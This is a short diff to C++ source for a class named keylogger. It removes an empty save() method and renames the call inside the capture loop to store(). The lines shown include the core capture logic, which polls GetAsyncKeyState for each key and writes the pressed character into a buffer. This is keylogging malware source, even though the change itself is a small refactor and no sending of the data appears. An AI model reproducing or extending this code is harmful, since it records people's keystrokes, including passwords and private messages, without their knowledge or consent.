@@ -12,11 +12,6 @@ keylogger::~keylogger()
 	delete a_buffer;
 }
 
-void keylogger::save()
-{
-
-}
-
 void keylogger::start()
 {
 	int t_count = 0;
@@ -26,7 +21,7 @@ void keylogger::start()
 			if (GetAsyncKeyState(t_key) == -32767)
 			{
 				*a_buffer = to_string((char) t_key);
-				save();
+				store();
 				t_count++;
 			}
 }
